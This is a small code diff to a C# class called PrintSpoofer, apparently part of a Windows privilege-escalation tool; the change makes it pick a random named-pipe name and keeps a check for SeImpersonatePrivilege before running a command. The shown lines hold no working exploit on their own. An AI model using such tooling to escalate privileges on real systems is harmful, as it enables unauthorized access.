@@ -20,6 +20,11 @@ internal static class PrintSpoofer
         string executeCmd = null
     )
     {
+        if(string.IsNullOrEmpty(pipeName))
+        {
+            string hashCode = String.Format("{0:X}", Guid.NewGuid().GetHashCode());
+            pipeName = hashCode;
+        }
         var canSpoof = UserHelper.CheckPrivileges().ContainsKey("SeImpersonatePrivilege");
         if (!canSpoof)
         {
